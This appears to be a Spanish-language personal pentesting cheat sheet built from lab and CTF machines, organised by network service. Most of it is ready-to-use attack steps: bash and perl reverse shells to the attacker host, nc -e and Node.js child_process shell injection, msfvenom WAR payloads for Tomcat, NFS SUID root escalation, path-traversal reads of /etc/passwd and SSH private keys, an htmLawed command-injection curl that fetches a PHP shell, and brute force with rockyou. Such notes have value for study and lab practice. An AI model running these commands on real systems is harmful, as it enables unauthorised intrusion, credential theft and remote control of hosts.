1.- Ident

Ident Protocol

Es un protocolo de autenticación e usuarios que opera en el puerto 113/TCP.

Su propósito es proporcionar información sobre usuario que iniciaron una conexión en un sistema Unix/Linux.

Auditar el protocolo Ident

Ver su versión

nmap -sV -p 113 <IP_MAQUINA_A>

Ver usuarios que se han autenticado

nc -v <IP_MAQUINA_A> 113

Buscar vulnerabilidades:

searchsploit identd

o en exploit DB

Respuesta de nmap

nmap -sVC --min-rate 6000 -p113 -vvv -Pn 192.168.42.136

113/tcp open  ident?  syn-ack ttl 64
|_auth-owners: lucifer

hay un usuario lucifer que ha hecho conexión al sistema.

-------------------------------------------------------------------------------

2.- NFS 

Network File System

Protocolo de sistema de archivos distribuido que permite a los dispositivos de una red acceder a archivos remotos como si estuvieran en su propio sistema de archivos local.

Se usa principalmente en entornos UNIX/Linux para compartir directorios y archivos entre servidores y clientes.

Funciona sobre RPC (Remote Procedure Call) y utiliza puertos específicos como el 2049 para la comunicación.

listar recursos compartidos:

showmount -e 192.168.42.137

ejemplo:

showmount -e 192.168.42.137

me salió

Export list for 192.168.42.137:
/var/www/html *

significa que podemos traernos el sistema de archivos de /var/www/html *

creamos una carpeta para montarnos el sistema:

mkdir -p /mnt/nfs_share

montamos el sistema

sudo mount -t nfs 192.168.42.137:/var/www/html /mnt/nfs_share

creamos una reverse shell:

nano /mnt/nfs_share/reverse.php

el contenido es la reverse shell de pentestmonkey

luego nos ponemos en ecucha con el puerto que le asignamos en el reverse.php

nc -lvnp puerto

y en la url:

http://192.168.42.137/reverse.php

Escalar privilegios:

en la máquina víctima:

copiamos el /bin/bash al sistema de archivos que se comparte

para el ejemplo:

cp /bin/bash .

en kali:

en el sistema montado:

cambiamos el propietario a root y grupo a root:

sudo chown root:root ./bash

Cambiamos los permisos de un archivo y activamos el bit SUID (Set User ID) para el usuario propietario del archivo:

sudo chmod u+s ./bash

escalamos a root:

./bash -p

Desmontar el sistema de archivos NFS:

sudo umount /mnt/nfs_share

si me sale el error :

umount.nfs4: /mnt/nfs_share: device is busy

Ejecutamos:

sudo fuser -k /mnt/nfs_share

y volvemos a ejecutar:

sudo umount /mnt/nfs_share

-------------------------------------------------------------------------------

3.- RPCBind

Es un servicio que se ejecuta en sistemas UNIX/Linux y se encarga de asignar dinámicamente los puertos de los servicios basados en RPC, como NFS.

Permite que los clientes descubran en qué puerto están escuchando los servicios RPC.

Utiliza el puerto 111 por defecto.


4.- Nlockmgr

Network Lock Manager


Es un servicio auxiliar de NFS que gestiona bloqueos de archivos en un entorno distribuido.

Se encarga de coordinar accesos concurrentes a archivos compartidos, evitando conflictos entre múltiples clientes.

Usa RPC para su funcionamiento y generalmente asigna puertos dinámicos a través de RPCBind.

5.- Mountd

Es parte del sistema NFS (Network File System) y se encarga de gestionar las solicitudes de montaje de sistemas de archivos remotos en un servidor NFS.

Mantiene un registro de los clientes que han montado el sistema de archivos, permitiendo que el administrador vea qué máquinas están accediendo a los recursos compartidos.

-------------------------------------------------------------------------------

6.- ipp 

El servicio IPP (Internet Printing Protocol) que corre en el puerto 631 en Linux es parte del sistema de impresión CUPS (Common Unix Printing System).

CUPS 2.3.3op2 tiene un exploit

https://github.com/IppSec/evil-cups/blob/main/evilcups.py

copiamos el contenido del exploit porque no se puede clonar ya que no es un repositorio, solo es un código en python.

forma de ejecutar:

python3 exploit.py IP-KALI IP-VICTIMA "bash -c 'bash -i >& /dev/tcp/IP-KALI/443 0>&1'"

primero me sale el error que debo instalar ippserver

me sale un error: externally-managed-environment

al hacer pip3 install ippserver que se requiere para el exploit

entonces creamos un entorno virtual 

python3 -m venv ippserver_env

Activamos el entorno

source ippserver_env/bin/activate

Instala el paquete dentro del entorno

pip install ippserver

Ejecuta el exploit usando Python dentro del entorno virtual

python exploit.py 192.168.42.133 192.168.42.143 "bash -c 'bash -i >& /dev/tcp/192.168.42.133/443 0>&1'"

nos ponemos a la escucha nc -lvnp 443

luego en la web entramos por el puerto 631 y en impresoras veremos una impresora llamada HACKED_IP-KALI

Ahora para que el comando se ejecute, deberemos entrar en ella y desglosar Maintenance y luego clic en "print test page". Una vez hecho recibiremos una shell por el puerto 443 y listo estooy dentro.

-------------------------------------------------------------------------------

7.- SAMBA

139/tcp open  netbios-ssn  
445/tcp open  microsoft-ds 

Enumerar usuarios, dominios

enum4linux 192.168.42.144 -> S-1-22-1-1000 Unix User\s3cur4 (Local User)

Fuerza bruta 

sudo netexec smb 192.168.42.144 -u 's3cur4' -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding | grep -v "STATUS_LOGON_FAILURE"

EXEC\s3cur4:123456 (Guest)

Enumerar recursos compartidos para s3cur4:

smbmap -H 192.168.42.144 -u s3cur4 -p 123456

server  READ, WRITE Developer Directory


loguearme
smbclient //192.168.42.144/server -U s3cur4%123456

subir un archivo
put archivo.ext

Magic script

si tenemos un recurso compartido, samba (139, 445) y no podemos podemos acceder a la máquina es bueno revisar archivos conf,yaml,env,xml

enumeramos:

feroxbuster --url http://192.168.0.251 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x conf,yaml,env,xml

ejemplo

máquina magic - Vulnyx

si dentro del archivo conf encontramos algo como:

[tmp]
   comment = Temp Directory
   browseable = yes
   valid users = xerosec
   read only = no
   magic script = config.sh
   create mask = 0700
   directory mask = 0700
   path = /tmp/

  magic script = config.sh esto es una vulnerabilidad crítica, podemos subir un archivo con config.sh con una reverse shell

nano config.sh

perl -e 'use Socket;$i="IP-KALI";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'

lo subimos al samba y luego nos ponemos en escucha por el puerto 443

-------------------------------------------------------------------------------

8.- websvn

websvn 2.6.0

Buscamos en searchsploit:

searchsploit websvn 2.6.0

descargamos de searchsploit

searchsploit -m php/webapps/50042.py

configuramos el PAYLOAD de 50042.py:

PAYLOAD = "/bin/bash -c 'bash -i >& /dev/tcp/IP-KALI/443 0>&1'"

nos ponemos en escucha con netcat en el puerto 443

-------------------------------------------------------------------------------

9.- netkit-rsh rexecd

protocolo antiguo para conexión remota, tipo ssh pero inseguro

512/tcp open  exec
513/tcp open  login
514/tcp open  shell

podemos aplicar hydra para fuerza bruta

hydra -l lisa -P /usr/share/wordlists/rockyou.txt rlogin://192.168.42.156 -t 64 -I

instalamos rsh-client ya que es un protocolo antiguo

sudo apt install rsh-client

forma de conexión 

rlogin IP-remota -l username

-------------------------------------------------------------------------------

10.- Mongo db 

corre en el puerto 27017

ejemplo: 

máquina collections - dockerlabs.
máquina robot - vulnyx


27017/tcp open  mongodb syn-ack ttl 64 MongoDB 7.0.9

mongo --host 172.17.0.1 --port 27017

comandos básicos:

monstrar bases de datos:
show dbs;

resultado del comando show dbs;
accessos
admin
config
local

acceder a una base de datos:
use accesos;

mostrar las colecciones:
show collections;

resultado el comando show collections:
usuarios

ver todos los documentos de la colección usuarios, mostrando los resultados en un formato más fácil de leer
db.usuarios.find().pretty();

-------------------------------------------------------------------------------

11.- Raspberry Pi en Linux

Se refiere a la utilización de un sistema operativo basado en Debian Linux en la computadora Raspberry Pi

Raspberry Pi es un microordenador de bajo costo y tamaño reducido


Sistemas operativos para Raspberry Pi _

- Raspbian: Un sistema operativo libre basado en Debian

- Kali Linux: Una distribución de Debian para pruebas de                          seguridad y penetración de sistemas

- Pidora: Una variación de Fedora que incluye un modo headless                   (sin monitor)

- Windows 10 IoT Core: Un sistema operativo propietario de                                                 Microsoft

-Ubuntu Core: Una versión minimalista de la edición de servidor                               de Ubuntu

El lenguaje predeterminado y más utilizado para la programación de Raspberry Pi es Python. 

-------------------------------------------------------------------------------

12.- Node.js 

5000/tcp open  http  Node.js (Express middleware)

al acceder a la web por el puerto 5000

me aparece un input para ingresar texto

yo ingreso por ejemplo Daniel

http://192.168.42.159:5000/?name=daniel&token=47421671

le cambiamos el token por cualquier cosa por ejemplo asdasd

me aparece un error, entonces aplicamos lo siguiente

nodejs reverse shell, introducirlo por url

require('child_process').exec('nc -e /bin/bash IP-KALI 443')

nos ponemos en escucha con netcat por el puerto 443 y listo

13.- sar2html 3.2.1

sar2html 3.2.1 es una herramienta utilizada para convertir los archivos de datos generados por la utilidad sar (System Activity Report) de Linux en un formato HTML visualmente más amigable y fácil de interpretar. sar es una herramienta que recoge y reporta estadísticas de rendimiento del sistema, como el uso de CPU, memoria, disco, y más. Estos informes suelen ser bastante técnicos y se presentan en un formato de texto que puede ser difícil de interpretar para algunos usuarios.

sar2html se encarga de tomar esos archivos generados por sar (que generalmente tienen extensión .sar o .data) y los convierte en informes en formato HTML que pueden ser visualizados en un navegador. Esto facilita la interpretación y análisis de las estadísticas del sistema de forma más visual.

Características principales de sar2html:
Conversión de SAR a HTML: Transforma los datos del comando sar en informes de HTML con gráficos y tablas.

Visualización de estadísticas: Permite ver el rendimiento del sistema con gráficos sobre el uso de CPU, memoria, disco, y otras métricas clave.

Fácil acceso y análisis: Los informes en HTML permiten que se pueda acceder fácilmente desde cualquier navegador sin necesidad de interpretar los datos brutos de sar.

Compatibilidad con versiones anteriores de SAR: Funciona con los archivos generados por el comando sar en diversas versiones de Linux.

Este software tiene un exploit

lo descargamos:

searchsploit -m php/webapps/49344.py

lo ejecutamos

python 49344.py

nos pide que insertemos un url donde corre sar2html 3.2.1

luego nos pide ejecutar comandos, pero no funciona ejecutar un 

bash -c "bash -i >& /dev/tcp/192.168.42.133/443 0>&1"

entonces nos paramos /var/www/vhost ya que es en un subdominio donde lo encontramos, y subimos una reverse shell

nos ponemos en escucha con netcat

luego en la url accedemos a la reverse shell.

http://sar.pl0t.nyx/reverse.php

-------------------------------------------------------------------------------

14.- weborf 0.12.2

Es un servidor web que permite compartir archivos usando el protocolo HTTP.

en el ejemplo máquina Share - vulnyx corre en el puerto 8080

tiene un exploit

https://www.exploit-db.com/exploits/14925

forma de explotar

https://192.168.42.161:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd

LFI

podemos ver el id_rsa pero tenemos que urlencodear

urlencoded
/../../../../../../../home/username/.ssh/id_rsa

https://192.168.42.161:8080/urlencoded

si tiene el puerto ssh corriendo usamos el id_rsa

-------------------------------------------------------------------------------

15.- tftp

Protocolo UDP que corre en el puerto 69

se puede escanear con metasploit.

lo buscamos como search tftpbrute

auxiliary/scanner/tftp/tftpbrute

usando este exploit me saldrá que es lo que tengo en tftp

me conecto sin contraseña

tftp IP-VÍCTIMA

get archivo

Nota: la consola interactiva de tftp no me permite lanzar comandos mas que el comando get, no me permite listar
-------------------------------------------------------------------------------

16.- node-RED 3.0.2

software web que normalmente corre en el puerto 1880

establecemos 3 nodos:

nodos de netword

tcp in

tcp out

y un nodo functions

exec

la interfaz grafica es la siguiente

tcp in ------> exec ------> tcp out

las 3 puntos de exec se conecta al punto de tcp out

luego configuramos

en kali:

colocamos puertos en escucha

nc -lvnp 443 -> nodo tcp in

nc -lvnp 4444 -> nodo tcp out

en node-red:

nodo tcp in:

Type: connect to

port: 443

at host 192.168.42.133

en exec:

en command:

bash -c "bash -i >& /dev/tcp/IP-KALI/4444 0>&1"

en nodo tcp out:

Type: Reply to TCP

luego seleccionamos todo:

tcp in ------> exec ------> tcp out

(tiene que aparecer una sombra naranja)

y le damos clic en Deploy, tiene que salirme el mensaje Deplou suscessfully

le damos enter en la shell donde tenemos el puerto de escucha 443 y listo tenemos conexión en el puerto 4444

-------------------------------------------------------------------------------

17.- Apache Tomcat

servidor web mas popular para Java.

tiene interfaz web llamada Adaministra

/manager -> tomcat:s3cret

creo un reverse.var con msfvenom

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.42.133 LPORT=443 -f war -o reverse.war

nos  ponemos en escucha con netcat en el puerto 443

subimos el reverse.war a tomcat

ruta donde podemos ver usuarios y contraseñas, cuando ya estamos dentro de la máquina.

/etc/tomcat9/tomcat-users.xml

-------------------------------------------------------------------------------

18.- UnrealIRCd

Puede estar corriendo en puertos como 6667, 6697

servidor de IRC (Internet Relay Chat) muy popular, especialmente en entornos de comunidades, hacking y labs de ciberseguridad.

UnrealIRCd es una implementación del protocolo IRC, que permite crear servidores de chat

Se ejecuta en Linux, OS X y Windows

En Linux, UnrealIRCd:
- Es un servicio/daemon que escucha en un puerto   (normalmente 6667 o 6697 para TLS)

- Se suele instalar en /home/<usuario>/unrealircd/ o   /etc/unrealircd/

- Tiene un archivo de configuración: unrealircd.conf


Rutas comunes:

Ruta	                                              Descripción
/etc/unrealircd/unrealircd.conf   Config principal
/usr/sbin/unrealircd	                         Binario ejecutable del servidor
/var/log/unrealircd/	                         Logs del servicio
~/.unrealircd/	                        Configuración por usuario                                                                    (ocasional)

ver versión

nmap -sV --script irc-info -p 6667 192.168.42.167

UnrealIRCd 3.2.8.1 

en metasploit 

exploit/unix/irc/unreal_ircd_3281_backdoor 

con el payload 

payload/cmd/unix/reverse_perl

se abre una sesion con el usuario server

al momento que se ejecuta el exploit tenemos que enviarnos una reverse shell con bash

escribimos en la sesion abierta con metasploit

bash -c "bash -i >& /dev/tcp/192.168.42.133/443 0>&1" 

nos ponemos en escucha con netcat en el puerto 443

listo tenemos una conexion mas comoda

Otra forma es usando un exploit de github:


https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py

modificamos el exploit en la parte:

# Sets the local ip and port (address and port to listen on)
local_ip = ''  # CHANGE THIS
local_port = ''  # CHANGE THIS

nos ponemos en escucha con netcat con el puerto local_port

python3 exploit.py 192.168.42.167 6667 -payload=netcat

listo tenemos acceso !!!

-------------------------------------------------------------------------------

19.- PHP 8.1.0-dev

generalmente corre en el puerto 8080

existe un exploit en searchsploit -> PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution

lo descargamos 

searchsploit -m php/webapps/49933.py

forma de ejecutar

python3 49933.py

me aparece:

Enter the full host url:

http://IP-VICTIMA:port

luego nos mandamos una bash

bash -c "bash -i >& /dev/tcp/IP-HACKER/PORT-ATTACK 0>&1"

nos ponemos en escucha con netcat:

nc -lnvp PORT-ATTACK

-------------------------------------------------------------------------------

20.- Finger

corre en el puerto 79

protocolo de Internet que permite obtener información sobre los usuarios conectados a un sistema remoto

version Linux fingerd

servía para consultar información sobre los usuarios de un sistema

enumerar usuarios en el sistema mediante fingerd

https://github.com/pentestmonkey/finger-user-enum/blob/master/finger-user-enum.pl

creamos un archivo nano finger_enum.pl y copiamos el codigo

luego chmod +x finger_enum.pl

./finger_enum.pl -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.42.172 -p 79

tiene que aparecer algo a esto:

adam@192.168.42.172: Login: adam           			Name: adam..Directory: /home/adam               	Shell: /bin/bash..Last login Sun Apr 23 13:21 2

nos podemos conectar como:

finger username@IP-VÍCTIMA

luego de encontrar algún usuario, como en este ejemplo adam, podemos hacer fuerza bruta con hydra o cualquier otra cosa según lo que encontremos.

-------------------------------------------------------------------------------

21- DNS - ISC BIND y existe algún dominio

dominio: swamp.nyx

Obtener toda la configuracion del dominio dns

tiene que haber un dominio y el puerto 53 corriendo DNS

dig axfr swamp.nyx @IP-DEL-DOMINIO

aquí podemos encontrar sudominios que luego agregamos al /etc/hosts

-------------------------------------------------------------------------------

22.- Psy Shell v0.12.4




ip: 192.168.42.182

para el ejemplo está corriendo en el puerto 3000 

resultado de nmap -sVC

3000/tcp open  ppp?    syn-ack ttl 64
| fingerprint-strings: 
|   GenericLines, NULL: 
|     Psy Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|     version is available at psysh.org/psysh (current: v0.12.4, latest: v0.12.8)
|   GetRequest: 
|     GET / HTTP/1.0
|     Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|     version is available at psysh.org/psysh (current: v0.12.4, latest: v0.12.8)
|     HTTP/1.0
|     Error Undefined constant "GET".
|   HTTPOptions: 
|     OPTIONS / HTTP/1.0
|     Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|     version is available at psysh.org/psysh (current: v0.12.4, latest: v0.12.8)
|     OPTIONS / HTTP/1.0
|     Error Undefined constant "OPTIONS".
|   Help: 
|     HELP
|     Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|     version is available at psysh.org/psysh (current: v0.12.4, latest: v0.12.8)
|     HELP
|     Error Undefined constant "HELP".
|   NCP: 
|     DmdT^@^@^@
|     ^@^@^@^A^@^@^@^@
|   RTSPRequest: 
|     OPTIONS / RTSP/1.0
|     Shell v0.12.4 (PHP 8.2.20 
|     cli) by Justin Hileman
|     version is available at psysh.org/psysh (current: v0.12.4, latest: v0.12.8)
|     OPTIONS / RTSP/1.0
|_    Error Undefined constant "OPTIONS".


Lo primero que tenemos que hacer es conectarnos

nc 192.168.42.182 3000

luego vemos las funciones que tenemos deshabilitadas:

echo "Funciones deshabilitadas: " . ini_get('disable_functions');

Si la salida está vacía, significa que no hay funciones deshabilitadas (todas están disponibles). Si hay una lista como shell_exec,passthru,system, esas son las funciones bloqueadas.

si está vacía, podemos hacer una reverse shell:
system('bash -c "bash -i >& /dev/tcp/TU_IP/443 0>&1"');

podemos ver también el /etc/passwd

echo file_get_contents('/etc/passwd');

ejemplo de resultado:
alfred

o si tenemos el puerto ssh abierto podemos ver el archivo id_rsa de alfred

echo file_get_contents('/home/alfred/.ssh/id_rsa');

-------------------------------------------------------------------------------

23.- SIP

El Protocolo de Iniciación de Sesión (SIP) es un protocolo de señalización utilizado para establecer, gestionar y finalizar sesiones multimedia, como llamadas de voz y videoconferencias, a través de redes de telecomunicaciones, especialmente en VoIP (Voz sobre IP)

Puerto: 5060

Herramienta para auditar:

https://github.com/Pepelux/sippts

sippts <command> -h

utilizamos leak para ver vulnerabilidades

vamos jugando con la herramienta, según las necesidades


24.- rsync

verificamos si podemos subir algo como permisos de escritura:

aplicamos la técnica del apunte 24 del archivo apuntes.txt, lo buscamos como ssh-keygen

rsync IP::

25.- htmLawed 1.2.5

URL =http://IP/path/to/htmLawedTest.php

palabras clave, URL y COMANDO

curl -s -d 'sid=foo&hhook=exec&text=COMANDO' -b 'sid=foo' URL |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'

subimos una reverse shell en php

curl -s -d "sid=foo&hhook=exec&text=wget http://IP-KALI/rev.php" -b 'sid=foo' URL |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
 

luego nos ponemos en escucha con netcat, según el rev.php

y listo hemos accedido

guía:

https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/POC_2022-35914.sh


o también accedemos a settings y en la parte de hook colocamos exec

y ejecutamos la siguiente rev shell


busybox nc IP-KALI PORT -e /bin/bash

26.- Pluck CMS 4.7.13

searchsploit pluck 4.7.13

searchsploit -m php/webapps/49909.py

forma de uso:

python3 49909.py 192.168.42.195 80 admin "/pluck/"

posible resultado:

Authentification was succesfull, uploading webshell

Uploaded Webshell to: http://192.168.42.195:80/pluck//files/shell.phar

accedemos a la ruta:

http://192.168.42.195:80/pluck//files/shell.phar

y se verá una webshell que te permite ejecució remota de comandos.

27.- RITECMS 3.0

La vulnerabilidad pertence a RITECMS 3.1.0

- Nos autenticamos, admin: admin 

- Nos dirijimos http://192.168.42.197/ritedev/admin.php

- luego clic en file manager

- eliminamos el .htaccess en el directory media y en file

- subimos un reverseshell en php

- No ponemos en escucha con netcat por el puerto del reverse shell

- accedmos a  http://192.168.42.197/ritedev/files/rev.php

- Listo estamos dentro

Nota:
- Debemos ver como es la url, el agunos ejemplos no es ritedev sino como ritecms3.0 o otro path

28.- Cockpit web

tiene una terminal para ejecutar comandos en la parte terminal.

29.- musicco 2.0.0


exploit

https://www.exploit-db.com/exploits/45830

en PATH colocamos el directorio donde corre musicco

hacemos fuzzing web:

wfuzz -c --hc=404,500 --hl=30433 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 'http://192.168.42.199/playlist/?getAlbum&parent=../FUZZ&album=Efe' 

30.- Werkzeug httpd 2.3.4

vulnerable a SSTI

buscamos el parámetro vulnerable

wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.42.200:8080/?FUZZ={{7 * 7}}' --hh=18

















